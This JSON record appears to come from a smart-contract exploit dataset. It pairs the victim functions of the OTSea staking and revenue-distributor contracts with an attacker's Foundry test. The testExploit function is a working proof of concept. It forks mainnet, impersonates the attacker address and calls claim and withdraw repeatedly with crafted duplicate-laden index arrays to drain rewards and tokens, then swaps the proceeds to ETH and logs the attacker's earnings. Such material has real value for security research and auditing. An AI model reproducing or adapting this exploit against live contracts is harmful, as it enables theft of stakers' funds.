[
  {
    "contract/interface": "OTSeaRevenueDistributor",
    "source_type": "victim_contract",
    "function_name": "distribute",
    "original_code": "    function distribute() external {\n        if (!isInitialized()) revert NotInitialized();\n        (uint32 epochNumber, OTSeaStaking.Epoch memory epoch) = stakingContract.getCurrentEpoch();\n        if (epochNumber == 1) {\n            if (msg.sender != stakingContract.owner()) revert OTSeaErrors.Unauthorized();\n        } else if (block.timestamp < epoch.startedAt + minInterval) {\n            revert OTSeaErrors.NotAvailable();\n        }\n        uint256 balance = address(this).balance;\n        if (balance < MINIMUM_DISTRIBUTION || epoch.totalStake < MINIMUM_STAKE) {\n            stakingContract.skipEpoch();\n        } else {\n            stakingContract.distribute{value: balance}();\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        vm.label(otseaDist, \"OTSeaRevenueDistributor\");\n        vm.label(attackContract, \"Attacker\");\n        vm.label(otseaToken, \"OTSea: OTSea Token\");\n        vm.label(uniswapRouter, \"Uniswap V2: Router 2\");\n        vm.label(otseaStaking, \"OTSeaStaking\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        OTSeaRevenueDistributor(otseaDist).distribute();\n        vm.startPrank(attackContract);\n        for (uint256 i = 0; i < 14; i++) {\n            uint256[] memory indexes = new uint256[](21);\n            for (uint256 j = 0; j < 20; j++) {\n                indexes[j] = j;\n            }\n            indexes[20] = 20 + i;\n\n            OTSeaStaking(otseaStaking).claim(indexes, attackContract);\n            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);\n        }\n        for (uint256 i = 0; i < 10; i++) {\n            uint256[] memory indexes = new uint256[](2);\n            for (uint256 j = 0; j < 1; j++) {\n                indexes[j] = j;\n            }\n            indexes[1] = 34 + i;\n\n            OTSeaStaking(otseaStaking).claim(indexes, attackContract);\n            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);\n        }\n        for (uint256 i = 0; i < 22; i++) {\n            uint256[] memory indexes = new uint256[](25);\n            for (uint256 j = 0; j < 23; j++) {\n                indexes[j] = j + 20;\n            }\n            indexes[23] = 70;\n            indexes[24] = 43 + i;\n\n            OTSeaStaking(otseaStaking).claim(indexes, attackContract);\n            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);\n        }\n        address weth = IUniswapV2Router02(uniswapRouter).WETH();\n        IERC20(otseaToken).approve(uniswapRouter, 6_000_000_000_000_000_000_000_000);\n        address[] memory paths = new address[](2);\n        paths[0] = otseaToken;\n        paths[1] = weth;\n        IUniswapV2Router02(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(\n            6_000_000_000_000_000_000_000_000, 0, paths, attackContract, 1_726_188_611\n        );\n        vm.stopPrank();\n        uint256 balance = IERC20(otseaToken).balanceOf(attackContract);\n        console.log(\"Attacker earned:\", balance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OTSeaStaking",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "    function claim(uint256[] calldata _indexes, address _receiver) external {\n        if (_receiver == address(0)) revert OTSeaErrors.InvalidAddress();\n        uint256 totalRewards = _claimMultiple(_indexes);\n        _transferETHOrRevert(_receiver, totalRewards);\n        emit Claimed(_msgSender(), _receiver, _indexes, totalRewards);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OTSeaStaking",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256[] calldata _indexes, address _receiver) external {\n        if (_receiver == address(0)) revert OTSeaErrors.InvalidAddress();\n        (uint88 totalAmount, uint256 totalRewards) = _withdrawMultiple(_indexes);\n        if (totalRewards != 0) {\n            _transferETHOrRevert(_receiver, totalRewards);\n            emit Claimed(_msgSender(), _receiver, _indexes, totalRewards);\n        }\n        _otseaERC20.safeTransfer(_receiver, uint256(totalAmount));\n        emit Withdrawal(_msgSender(), _receiver, _indexes, totalAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Router02",
    "source_type": "victim_contract",
    "function_name": "WETH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUniswapV2Router02",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForETHSupportingFeeOnTransferTokens",
    "original_code": "    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n",
    "description": ""
  }
]